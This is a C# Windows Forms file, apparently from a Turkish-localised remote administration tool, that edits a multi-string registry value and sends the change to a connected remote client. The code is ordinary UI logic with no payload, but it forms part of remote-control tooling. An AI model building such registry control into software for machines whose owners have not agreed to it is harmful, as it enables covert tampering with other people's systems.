using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;
using xServer.KuuhakuCekirdek.KayıtDefteri;

namespace xServer.Formlar
{
    public partial class FrmÇokluStringEdit : Form
    {
        #region Constants

        private const string Uyarı_MSG =
            "REG_MULTI_SZ türündeki değerler boş bir string değeri içeremez. Kayıt Defteri Düzenleyicisi bulduğu boş string değerlerini kaldıracaktır.";

        #endregion

        private readonly Client _connectClient;
        private readonly string _keyPath;
        private readonly RegValueData _value;

        public FrmÇokluStringEdit(string keyPath, RegValueData value, Client c)
        {
            _connectClient = c;
            _keyPath = keyPath;
            _value = value;

            InitializeComponent();

            valueNameTxtBox.Text = value.Name;
            valueDataTxtBox.Lines = (string[]) value.Data;
        }

        private void FrmRegValueEditMultiString_Load(object sender, EventArgs e)
        {
            valueDataTxtBox.Select();
            valueDataTxtBox.Focus();
        }

        private string[] GetSanitizedStrings(string[] strs)
        {
            List<string> sanitized = new List<string>();
            foreach (string str in strs)
            {
                if (!string.IsNullOrWhiteSpace(str) && !string.IsNullOrEmpty(str))
                {
                    sanitized.Add(str);
                }
            }
            return sanitized.ToArray();
        }

        private void ShowWarning()
        {
            MessageBox.Show(Uyarı_MSG, "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        #region Ok and Cancel button

        private void okButton_Click(object sender, EventArgs e)
        {
            string[] lines = valueDataTxtBox.Lines;
            if (lines.Length > 0)
            {
                string[] valueData = GetSanitizedStrings(lines);
                if (valueData.Length != lines.Length)
                {
                    ShowWarning();
                }
                new DoChangeRegistryValue(_keyPath, new RegValueData(_value.Name, _value.Kind, valueData)).Execute(
                    _connectClient);
            }
            Close();
        }

        private void cancelButton_Click(object sender, EventArgs e)
        {
            Close();
        }

        #endregion
    }
}